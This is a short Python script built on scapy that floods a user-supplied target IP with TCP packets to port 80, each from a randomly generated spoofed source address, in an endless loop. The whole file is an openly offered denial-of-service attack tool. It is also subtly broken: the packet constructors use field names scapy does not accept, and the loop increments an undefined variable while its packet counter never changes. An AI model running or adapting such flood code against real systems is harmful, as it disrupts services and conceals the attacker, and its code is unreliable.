import random
from scapy.all import *
target_IP = input("Enter IP address of target machine: ")
source_port = int(input("Enter source port number: "))

counter = 1

while True:
	
	first4Bits = str(random.randint(1, 254))
	second4Bits = str(random.randint(1, 254))
	third4Bits = str(random.randint(1, 254))
	fourth4Bits = str(random.randint(1, 254))
	dot = "."

	# creating random source IP
	source_IP = first4Bits + dot + second4Bits + dot + third4Bits + dot + fourth4Bits
	
	# creating packets
	ipInformation = IP(source_IP = source_IP, destination = target_IP)
	TCPInformation = TCP(srcport = source_port, dstport = 80)
	packet = ipInformation / TCPInformation
	
	send(packet, inter = 0.001)

	print("No of packets sent: ", counter)
	i = i + 1

